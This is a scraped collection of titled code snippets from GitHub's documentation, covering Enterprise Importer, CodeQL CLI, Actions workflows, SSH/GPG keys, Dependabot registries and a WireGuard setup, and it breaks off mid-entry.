https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/completing-your-migration-with-github-enterprise-importer/reclaiming-mannequins-for-github-enterprise-importer.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\ngh bbs2gh generate-mannequin-csv --github-org DESTINATION --output FILENAME.csv\n```\n\n----------------------------------------\n\nTITLE: Destroying the storage-server service for a node (ghe-storage)\nDESCRIPTION: This command removes the storage-server service associated with a specific node from the GitHub Enterprise Server cluster. UUID should be replaced with the UUID of the node. The `--force` flag bypasses confirmation prompts.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/replacing-a-cluster-node.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\nghe-storage destroy-host storage-server-UUID --force\n```\n\n----------------------------------------\n\nTITLE: Auditing Bitbucket pipeline using config file\nDESCRIPTION: This command performs an audit of a Bitbucket instance using a specified YAML configuration file.  The `--config-file-path` argument tells the `actions-importer` to use the specified source files instead of fetching from the Bitbucket instance. The output is stored in the specified output directory.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bitbucket-pipelines-with-github-actions-importer.md#_snippet_12\n\nLANGUAGE: bash\nCODE:\n```\ngh actions-importer audit bitbucket --workspace :workspace --output-dir tmp/audit --config-file-path \"path/to/my/bitbucket/config.yml\"\n```\n\n----------------------------------------\n\nTITLE: C# XML Documentation Comments Configuration\nDESCRIPTION: This configuration snippet outlines the steps to enable XML documentation comments for C# in Visual Studio.  It explains how to select the options to generate XML documentation comments and configure insertion of comment markers. No external dependencies are required; this is a configuration process within Visual Studio.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/getting-code-suggestions-in-your-ide-with-github-copilot.md#_snippet_7\n\n\n\n----------------------------------------\n\nTITLE: Recovering Commits using `git reflog`\nDESCRIPTION: This section demonstrates how to recover commits made in a detached HEAD state using the `git reflog` command in the Git command line. The example shows the output of `git reflog` and identifies a commit to recover, followed by using `git cherry-pick` to apply the commit to the current branch.\nSOURCE: https://github.com/github/docs/blob/main/content/desktop/managing-commits/checking-out-a-commit-in-github-desktop.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n81fa9136f8 (HEAD -> main) HEAD@{0}: checkout: moving from 8bd5e736a27a52a7e36a856b30e6f0582d341aa1 to main\n8bd5e736a2 HEAD@{1}: commit: testing out a feature\n22fa76c125 HEAD@{2}: checkout: moving from main to 22fa76c1250a2847305b9325752d941dbaa55983\n```\n\n----------------------------------------\n\nTITLE: Travis CI Syntax for Caching (YAML)\nDESCRIPTION: This YAML snippet demonstrates the caching configuration in Travis CI. It specifies that the `npm` dependencies should be cached.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-travis-ci-to-github-actions.md#_snippet_10\n\nLANGUAGE: yaml\nCODE:\n```\nlanguage: node_js\ncache: npm\n```\n\n----------------------------------------\n\nTITLE: CodeQL Database Cleanup Command\nDESCRIPTION: This command compacts a CodeQL database on disk by deleting temporary data and minimizing its size without affecting future usability. It requires the path to the CodeQL database as input.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/database-cleanup.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql database cleanup <options>... -- <database>\n```\n\n----------------------------------------\n\nTITLE: Searching models by transparency info on GitHub Marketplace\nDESCRIPTION: This snippet demonstrates how to search for models that mention 'responsible ai' in their transparency information using the `in:transparency` qualifier.  The search query filters models based on the presence of the specified text in their transparency details.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/searching-on-github/searching-github-models.md#_snippet_2\n\nLANGUAGE: URL\nCODE:\n```\nhttps://github.com/search?q=in:transparency+%22responsible+ai%22&type=marketplace\n```\n\n----------------------------------------\n\nTITLE: Executing CodeQL query-server2\nDESCRIPTION: Executes the CodeQL `query-server2` command, which is designed for use by IDE plugins to run queries. The command supports options for controlling the number of threads, setting timeouts, enabling tuple counting, and managing the disk cache. It communicates with the IDE through standard input and output streams.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/execute-query-server2.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql execute query-server2 [--threads=<num>] <options>...\n```\n\n----------------------------------------\n\nTITLE: Filtering Imported Queries - YAML\nDESCRIPTION: This example demonstrates filtering queries that were imported from another query suite. It imports the `cpp-security-and-quality` suite from the `codeql/cpp-queries` pack and then excludes queries with `low` or `medium` precision.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/creating-codeql-query-suites.md#_snippet_18\n\nLANGUAGE: yaml\nCODE:\n```\n- import: codeql-suites/cpp-security-and-quality.qls\n  from: codeql/cpp-queries\n- exclude:\n    precision:\n      - low\n      - medium\n```\n\n----------------------------------------\n\nTITLE: Conditional rendering with elsif statement for FPT and GHES\nDESCRIPTION: This snippet checks if the current version is FPT and renders 'condition-d' if true; if not, it checks if the version is GHES and renders 'condition-e'.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/liquid/ifversion.md#_snippet_2\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion fpt %}\ncondition-d\n{% elsif ghes %}\ncondition-e\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Example Migration Source Response JSON\nDESCRIPTION: This JSON represents a successful response after creating a migration source using the GraphQL mutation.  The `id` field is the migration source ID and is needed for subsequent steps.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-between-github-products/migrating-repositories-from-githubcom-to-github-enterprise-cloud.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"data\": {\n    \"createMigrationSource\": {\n      \"migrationSource\": {\n        \"id\": \"MS_kgDaACQxYmYxOWU4Yi0wNzZmLTQ3NTMtOTdkZC1hNGUzZmYxN2U2YzA\",\n        \"name\": \"GitHub.com Source\",\n        \"url\": \"https://github.com\",\n        \"type\": \"GITHUB_SOURCE\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Environment URL Using Output - YAML\nDESCRIPTION: This snippet shows how to dynamically define the environment URL using the output of a previous step. The `url` property uses an expression `${{ steps.step_id.outputs.url_output }}` to retrieve the URL from a step named `step_id`.  The `step_id` must have an output called `url_output`.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/section-using-environments-for-jobs.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nenvironment:\n  name: production_environment\n  url: ${{ steps.step_id.outputs.url_output }}\n```\n\n----------------------------------------\n\nTITLE: Generating a new SSH key with email - RSA fallback - Shell\nDESCRIPTION: This command generates a new SSH key using the RSA algorithm with a key size of 4096 bits and associates it with the provided email address. This is a fallback option for older systems that do not support the Ed25519 algorithm.  The email is used as a label for the key.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nssh-keygen -t rsa -b 4096 -C \"your_email@example.com\"\n```\n\n----------------------------------------\n\nTITLE: Using External Repository Token for Configuration File\nDESCRIPTION: This YAML snippet shows how to provide a token to access a configuration file located in an external private repository.  The `external-repository-token` parameter of the `init` action is used to specify a token with access to the private repository. The token should have the necessary permissions to access the repository.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/customizing-your-advanced-setup-for-code-scanning.md#_snippet_14\n\nLANGUAGE: yaml\nCODE:\n```\n- uses: {% data reusables.actions.action-codeql-action-init %}\n  with:\n    external-repository-token: {% raw %}${{ secrets.ACCESS_TOKEN }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Unbundle CodeQL Database\nDESCRIPTION: This command extracts a CodeQL database archive specified by `<archive>`. The `--name` option allows specifying a new name for the extracted database, and `--target` allows specifying the directory where the database should be extracted. If `--name` is not provided, the database retains its original name. If `--target` is not provided, the database is extracted to the current working directory.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/database-unbundle.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql database unbundle <options>... -- <archive>\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions Artifacts Syntax\nDESCRIPTION: This YAML snippet illustrates the syntax for uploading artifacts in GitHub Actions. It uses the `actions/upload-artifact` action to upload the `math-homework.txt` file as an artifact named `homework`. The `name` and `path` parameters are used to configure the artifact upload.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-gitlab-cicd-to-github-actions.md#_snippet_13\n\nLANGUAGE: yaml\nCODE:\n```\n- name: Upload math result for job 1\n  uses: {% data reusables.actions.action-upload-artifact %}\n  with:\n    name: homework\n    path: math-homework.txt\n```\n\n----------------------------------------\n\nTITLE: Forwarding Webhooks with GitHub CLI\nDESCRIPTION: This command configures webhook forwarding using the GitHub CLI. It forwards specified events from a repository to a local URL for testing. It requires specifying the repository, events, and URL as parameters. For organization webhooks, use the `--org` flag instead of `--repo`.\nSOURCE: https://github.com/github/docs/blob/main/content/webhooks/testing-and-troubleshooting-webhooks/using-the-github-cli-to-forward-webhooks-for-testing.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngh webhook forward --repo=REPOSITORY --events=EVENTS --url=URL\n```\n\n----------------------------------------\n\nTITLE: Assigning Node to Datacenter - Text\nDESCRIPTION: This configuration snippet demonstrates how to assign a specific node to a datacenter in the cluster configuration file. By adding the `datacenter = primary` key-value pair under the node's heading, the node is associated with the specified datacenter. Replace \"primary\" with the desired datacenter name.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/configuring-high-availability-replication-for-a-cluster.md#_snippet_2\n\nLANGUAGE: text\nCODE:\n```\ndatacenter = primary\n```\n\n----------------------------------------\n\nTITLE: Listing Files Matching a Pattern with grep\nDESCRIPTION: This command uses the `ls` command to list all files in the current directory and then pipes the output to `grep` to filter the results to only show files that contain the specified string in their name. This is used to verify the creation of files.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-iam/provisioning-user-accounts-with-scim/configuring-authentication-and-provisioning-with-pingfederate.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nls | grep MyPrivateKey.key\n```\n\n----------------------------------------\n\nTITLE: Change Git Remote URL\nDESCRIPTION: Illustrates how to use `git remote set-url` to change the URL of an existing remote. This command updates the remote's URL, allowing you to point to a different repository or switch between HTTPS and SSH URLs.  The example changes the 'origin' remote's URL.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/creating-and-managing-repositories/troubleshooting-cloning-errors.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\n$ git remote set-url origin https://github.com/ghost/ReactiveCocoa.git\n# Change the 'origin' remote's URL\n```\n\n----------------------------------------\n\nTITLE: Managing SCIM Identities with ghe-scim-identities-csv (Shell)\nDESCRIPTION: The `ghe-scim-identities-csv` utility allows administrators to output the SCIM identities for users on an instance. The utility can output a CSV file that lists all existing identities and the groups they are members of. Option `-f` specifies the file path.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_18\n\nLANGUAGE: shell\nCODE:\n```\nghe-scim-identities-csv\n```\n\nLANGUAGE: shell\nCODE:\n```\nghe-scim-identities-csv -f /PATH/TO/FILE\n```\n\n----------------------------------------\n\nTITLE: Listing SSH Keys with SHA256 Fingerprint\nDESCRIPTION: This snippet lists the SSH keys that have been added to the SSH agent, displaying their SHA256 fingerprint, which helps identify specific keys. It confirms which keys are available for authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/troubleshooting-ssh/error-permission-denied-publickey.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\n$ ssh-add -l -E sha256\n> 2048 SHA256:274ffWxgaxq/tSINAykStUL7XWyRNcRTlcST1Ei7gBQ /Users/USERNAME/.ssh/id_rsa (RSA)\n```\n\n----------------------------------------\n\nTITLE: Example Terminal Output - Shell\nDESCRIPTION: This shows an example of the terminal output you should see when the app receives an installation event. It confirms that the app is listening and successfully receiving notifications from GitHub.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_24\n\nLANGUAGE: shell\nCODE:\n```\n> D, [2023-06-08T15:45:43.773077 #30488] DEBUG -- : ---- received event installation\n> D, [2023-06-08T15:45:43.773141 #30488]] DEBUG -- : ----    action created\n> 192.30.252.44 - - [08/Jun/2023:15:45:43 -0400] \"POST /event_handler HTTP/1.1\" 200 - 0.5390\n```\n\n----------------------------------------\n\nTITLE: Downloading CodeQL Packs with CodeQL CLI\nDESCRIPTION: Downloads specified CodeQL packs using the `codeql pack download` command. The command requires an access token and accepts one or more pack specifiers in the format `<scope/name@version:path>`.  The access token is piped as standard input.  This is useful for offline analysis.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/customizing-analysis-with-codeql-packs.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\necho $OCTO-ORG_ACCESS_TOKEN | codeql pack download <scope/name@version:path> <scope/name@version:path> ...\n```\n\n----------------------------------------\n\nTITLE: Configuring RubyGems Registry with insecure code execution\nDESCRIPTION: This snippet configures a RubyGems registry with a URL and token, allowing insecure external code execution. It defines a Dependabot update configuration for bundler with a monthly schedule.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/configuring-access-to-private-registries-for-dependabot.md#_snippet_2\n\nLANGUAGE: YAML\nCODE:\n```\nversion: 2\nregistries:\n  ruby-github:\n    type: rubygems-server\n    url: https://rubygems.pkg.github.com/octocat/github_api\n    token: ${{secrets.MY_GITHUB_PERSONAL_TOKEN}}\nupdates:\n  - package-ecosystem: \"bundler\"\n    directory: \"/rubygems-server\"\n    insecure-external-code-execution: allow\n    registries: \"*\"\n    schedule:\n      interval: \"monthly\"\n```\n\n----------------------------------------\n\nTITLE: Adding Dummy Token to Workflow YAML\nDESCRIPTION: This snippet adds a dummy token to a GitHub Actions workflow YAML file to simulate accidental secret exposure and trigger a push protection alert. It involves modifying the `comment.yml` file in the `.github/workflows` directory and inserting a predefined dummy token string for testing purposes.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/learning-to-code/storing-your-secrets-safely.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nGH_TOKEN: \"{% data variables.secret-scanning.learner-example-secret-a %}{% data variables.secret-scanning.learner-example-secret-b %}\"\n```\n\n----------------------------------------\n\nTITLE: Defining Path Patterns for Coding Guidelines\nDESCRIPTION: This section explains how to limit coding guidelines to specific file types or paths using `fnmatch` syntax. The wildcard character `*` matches any string of characters, allowing flexible targeting of files and directories relevant to the coding guideline.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/code-review/configuring-coding-guidelines.md#_snippet_0\n\n\n\n----------------------------------------\n\nTITLE: Importing Large Files with Git LFS\nDESCRIPTION: This command imports files larger than {% data variables.product.github %}'s file size limit into {% data variables.large_files.product_name_short %}.  It identifies large files and stores pointers in Git while storing the large file content separately. This allows for versioning of large files without bloating the Git repository.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/migrations/push-to-github.md#_snippet_1\n\nLANGUAGE: Git\nCODE:\n```\ngit lfs import\n```\n\n----------------------------------------\n\nTITLE: Syntax Highlighting with Ruby Code\nDESCRIPTION: Shows how to enable syntax highlighting for Ruby code within a fenced code block.  Specifying the language identifier (ruby) after the opening triple backticks tells the Markdown renderer to apply Ruby-specific syntax highlighting.  Uses the `redcarpet` gem as an example.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/working-with-advanced-formatting/creating-and-highlighting-code-blocks.md#_snippet_2\n\nLANGUAGE: text\nCODE:\n```\n```ruby\nrequire 'redcarpet'\nmarkdown = Redcarpet.new(\"Hello World!\")\nputs markdown.to_html\n```\n```\n\n----------------------------------------\n\nTITLE: Conditional Table Row (Alternative)\nDESCRIPTION: This snippet demonstrates an alternative way to conditionally include a table row based on the `volvo` version using the `{%- ifversion volvo %}` tag, which might handle whitespace differently. It checks if the `volvo` version is enabled and includes the Cargo and Rust row if it is.\nSOURCE: https://github.com/github/docs/blob/main/src/content-linter/tests/fixtures/tables.md#_snippet_1\n\nLANGUAGE: Markdown\nCODE:\n```\n{%- ifversion volvo %}\n| Cargo | Rust | `Cargo.lock` | `Cargo.toml`, `Cargo.lock` |\n{%- endif %}\n```\n\n----------------------------------------\n\nTITLE: Adding postCreateCommand to devcontainer.json\nDESCRIPTION: This code snippet demonstrates how to add a `postCreateCommand` to the `devcontainer.json` file. The `postCreateCommand` is used to run commands after the container is created. In this case, it installs the Python packages listed in the `requirements.txt` file using pip3.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/setting-up-your-project-for-codespaces/adding-a-dev-container-configuration/setting-up-your-python-project-for-codespaces.md#_snippet_2\n\nLANGUAGE: JSONC\nCODE:\n```\n// Use 'postCreateCommand' to run commands after the container is created.\n   \"postCreateCommand\": \"pip3 install --user -r requirements.txt\",\n```\n\n----------------------------------------\n\nTITLE: Conditional Link to GitHub Plans (Liquid)\nDESCRIPTION: This snippet conditionally displays a link to the GitHub Plans documentation. It uses the Liquid templating language to check if the GitHub version is either 'fpt' (free, pro, and team) or 'ghec' (GitHub Enterprise Cloud). If the condition is true, it renders a link to the specified AUTOTITLE.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/gated-features/more-info-org-products.md#_snippet_0\n\nLANGUAGE: liquid\nCODE:\n```\n{% ifversion fpt or ghec %}For more information, see [AUTOTITLE](/get-started/learning-about-github/githubs-plans).{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Configuring Languages in CodeQL Analysis using Matrix Strategy (YAML)\nDESCRIPTION: This snippet demonstrates how to configure the languages to be analyzed by CodeQL using a matrix strategy in a workflow file. The `language` matrix variable defines the languages that CodeQL will analyze in parallel. This is the recommended approach for improving performance.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/customizing-your-advanced-setup-for-code-scanning.md#_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  analyze:\n    name: Analyze\n    ...\n    strategy:\n      fail-fast: false\n      matrix:\n        language: ['javascript-typescript', 'python']\n```\n\n----------------------------------------\n\nTITLE: Checking Job Distribution with ghe-cluster-balance status\nDESCRIPTION: This snippet demonstrates how to check the distribution of allocations using the `ghe-cluster-balance status` utility to identify any jobs that are not properly distributed. It displays healthy allocations in green and improperly distributed allocations in red.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/rebalancing-cluster-workloads.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nghe-cluster-balance status\n```\n\n----------------------------------------\n\nTITLE: Upload Support Bundle via SSH\nDESCRIPTION: This command uploads a support bundle to GitHub's support bundle server using SSH. It requires SSH access to the GitHub Enterprise Server instance and outbound HTTPS connections to specified endpoints. The `-u` flag likely indicates uploading, and `-x` may specify extended options.\nSOURCE: https://github.com/github/docs/blob/main/content/support/contacting-github-support/providing-data-to-github-support.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nssh -p122 admin@HOSTNAME -- 'ghe-support-bundle -u -x'\n```\n\n----------------------------------------\n\nTITLE: Pulling container image by name and latest tag - Docker CLI\nDESCRIPTION: This command pulls the latest version of a container image from the GitHub Container Registry by name. Replace `NAMESPACE` with the account or organization name, and `IMAGE_NAME` with the image name. This is equivalent to pulling by name without a tag, explicitly specifying `:latest` clarifies the intent.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-container-registry.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\n$ docker pull {% data reusables.package_registry.container-registry-hostname %}/NAMESPACE/IMAGE_NAME:latest\n```\n\n----------------------------------------\n\nTITLE: Specifying Queries from Another CodeQL Pack (YAML)\nDESCRIPTION: This YAML snippet illustrates how to include queries from a different CodeQL pack in a query suite. It includes the path to the subdirectory, the name of the ql-pack to use and the version. The queries instruction tells CodeQL to find the `.ql` files inside the directory of another CodeQL pack.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/creating-codeql-query-suites.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\n- queries: <path-to-subdirectory>\n  from: <ql-pack-name>\n  version: ^x.y.z\n```\n\n----------------------------------------\n\nTITLE: Handling HTTP Request Payload Validation Failures\nDESCRIPTION: This error message indicates that the HTTP request payload used to configure Azure resources failed validation against the API specification. This commonly arises when using an incorrect API version or an incorrect property such as the `businessId`.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/azure-vnet-hosted-compute-troubleshooting.md#_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\n(HttpRequestPayloadAPISpecValidationFailed) HTTP request payload failed validation against API specification with one or more errors. Please see details for more information.\n```\n\n----------------------------------------\n\nTITLE: Customize Subject Claim: Reusable Workflow\nDESCRIPTION: This JSON template customizes the `sub` claim to include the `job_workflow_ref`. This enables the use of reusable workflows to enforce consistent deployments. The cloud provider OIDC configuration should require a specific value for the `job_workflow_ref` claim.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect.md#_snippet_4\n\nLANGUAGE: json\nCODE:\n```\n{\n     \"include_claim_keys\": [\n         \"job_workflow_ref\"\n     ]\n  }\n```\n\n----------------------------------------\n\nTITLE: Trigger Workflow on Deployment Status Event - YAML\nDESCRIPTION: This snippet configures a workflow to run when a third party provides a deployment status. It specifies the `deployment_status` event. Deployments created with a commit SHA may not have a Git ref. A workflow run will not be triggered when a deployment status's state is set to `inactive`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  deployment_status\n```\n\n----------------------------------------\n\nTITLE: Making API request with query parameters using GitHub CLI\nDESCRIPTION: This example demonstrates how to use the GitHub CLI to make a GET request to the /events endpoint, specifying the per_page and page query parameters to limit the results.  It shows how to retrieve two issues per page and the first page of results.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/getting-started-with-the-rest-api.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\ngh api --method GET /events -F per_page=2 -F page=1\n--header 'Accept: application/vnd.github+json' \\\n```\n\n----------------------------------------\n\nTITLE: Regex pattern for Windows-compatible branch names\nDESCRIPTION: This regular expression ensures that branch names consist only of numbers, lowercase letters, hyphens, and underscores, promoting compatibility with case-insensitive file systems. It must be used with the \"Must match a given regex pattern\" requirement.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/repositories/rulesets-commit-regex.md#_snippet_0\n\nLANGUAGE: regex\nCODE:\n```\n\\A[0-9a-z-_]+\n```\n\n----------------------------------------\n\nTITLE: Storing GitHub App Credentials in .env file\nDESCRIPTION: This snippet demonstrates how to store GitHub App credentials such as App ID, Webhook Secret, and Private Key as environment variables in a `.env` file. It's crucial to add the `.env` file to `.gitignore` to avoid committing sensitive information.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nGITHUB_APP_IDENTIFIER=\"YOUR_APP_ID\"\nGITHUB_WEBHOOK_SECRET=\"YOUR_WEBHOOK_SECRET\"\nGITHUB_PRIVATE_KEY=\"YOUR_PRIVATE_KEY\"\n```\n\n----------------------------------------\n\nTITLE: Using an Action to Check PR Title - YAML\nDESCRIPTION: This YAML snippet demonstrates the recommended approach to mitigating script injection attacks by using an action to process the context value as an argument. The context value is not used to generate a shell script but is instead passed to the action as an argument, thus preventing injection.\nSOURCE: https://github.com/github/docs/blob/main/content/enterprise-onboarding/github-actions-for-your-enterprise/security-hardening-for-github-actions.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nuses: fakeaction/checktitle@v3\nwith:\n    title: {% raw %}${{ github.event.pull_request.title }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Individual Mannequin Reclamation with gei extension (GitHub CLI)\nDESCRIPTION: This command reclaims an individual mannequin and attributes their contributions to a specified user. Replace DESTINATION with the target GitHub organization name, MANNEQUIN with the mannequin's username, and USERNAME with the target user's username.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/completing-your-migration-with-github-enterprise-importer/reclaiming-mannequins-for-github-enterprise-importer.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngh gei reclaim-mannequin --github-target-org DESTINATION --mannequin-user MANNEQUIN --target-user USERNAME\n```\n\n----------------------------------------\n\nTITLE: Fetching a Specific Git Branch\nDESCRIPTION: This command fetches a specific branch from a remote repository. It is used to retrieve commits from the remote branch into the local repository.  `upstream` refers to the remote name and `recover-B` is the name of the branch being fetched.  This updates the local remote-tracking branch for `upstream/recover-B`.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/committing-changes-to-your-project/troubleshooting-commits/commit-exists-on-github-but-not-in-my-local-clone.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\n$ git fetch upstream recover-B\n# Fetch commit into your local repository.\n```\n\n----------------------------------------\n\nTITLE: Conditional Default Repository Setting\nDESCRIPTION: This code snippet checks the GitHub version and sets the default repository visibility to 'internal' if the version is either 'fpt' (Free, Pro, and Team) or 'ghec' (GitHub Enterprise Cloud). It's a conditional statement that configures repository settings based on the environment.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/repositories/internal-repo-default.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n{% ifversion fpt or ghec %}\nInternal repositories are the default setting for all new repositories created in an organization owned by an enterprise account.\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Pushing Changes to Remote Repository\nDESCRIPTION: Pushes the changes to the new remote repository. Replace `BRANCH-NAME` with the branch you want to push (e.g., `main`, `master`).\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/splitting-a-subfolder-out-into-a-new-repository.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\ngit push -u origin BRANCH-NAME\n```\n\n----------------------------------------\n\nTITLE: Editing GPG Key with ID\nDESCRIPTION: This command initiates the process of editing a GPG key using its ID. The provided GPG key ID is used to select the key that needs to be modified. It's a prerequisite for subsequent operations like adding a user ID (email address) to the GPG key.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/managing-commit-signature-verification/associating-an-email-with-your-gpg-key.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngpg --edit-key 3AA5C34371567BD2\n```\n\n----------------------------------------\n\nTITLE: Call Clone Repository Method\nDESCRIPTION: This Ruby code snippet retrieves the full repository name, repository name, and head SHA from the webhook payload.  It then calls the `clone_repository` helper method, passing these values as arguments. This snippet is placed within the `initiate_check_run` helper method.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_33\n\nLANGUAGE: ruby\nCODE:\n```\n    full_repo_name = @payload['repository']['full_name']\n    repository     = @payload['repository']['name']\n    head_sha       = @payload['check_run']['head_sha']\n\n    clone_repository(full_repo_name, repository, head_sha)\n```\n\n----------------------------------------\n\nTITLE: Configuring WireGuard in GitHub Actions Workflow\nDESCRIPTION: This YAML snippet demonstrates how to configure WireGuard within a GitHub Actions workflow to establish a connection to a private service. It installs WireGuard, sets up the interface, configures the WireGuard settings, and then tests the connection. The private key is assumed to be stored as a GitHub Actions secret named `WIREGUARD_PRIVATE_KEY`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/using-github-hosted-runners/connecting-to-a-private-network/using-wireguard-to-create-a-network-overlay.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: WireGuard example\n\non:\n  workflow_dispatch:\n\njobs:\n  wireguard_example:\n    runs-on: ubuntu-latest\n    steps:\n      - run: sudo apt install wireguard\n\n      - run: echo {% raw %}\"${{ secrets.WIREGUARD_PRIVATE_KEY }}\"{% endraw %} > privatekey\n\n      - run: sudo ip link add dev wg0 type wireguard\n\n      - run: sudo ip address add dev wg0 192.168.1.2 peer 192.168.1.1\n\n      - run: sudo wg set wg0 listen-port 48123 private-key privatekey peer examplepubkey1234... allowed-ips 0.0.0.0/0 endpoint 1.2.3.4:56789\n\n      - run: sudo ip link set up dev wg0\n\n      - run: curl -vvv http://192.168.1.1\n```\n\n----------------------------------------\n\nTITLE: Fetching user information programmatically\nDESCRIPTION: Fetches information about the current user using the `gh api user` command. This provides access to the GitHub API for retrieving user data.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/creating-github-cli-extensions.md#_snippet_10\n\nLANGUAGE: Shell\nCODE:\n```\ngh api user\n```\n\n----------------------------------------\n\nTITLE: Emit Compiler Generated Files in C#\nDESCRIPTION: Setting the `EmitCompilerGeneratedFiles` property to `true` during a C# build emits compiler-generated files to disk.  This enables CodeQL to analyze these files, which are often related to features like regular expressions, serialization, and web application view generation. Some legacy projects might experience issues, requiring troubleshooting.\nSOURCE: 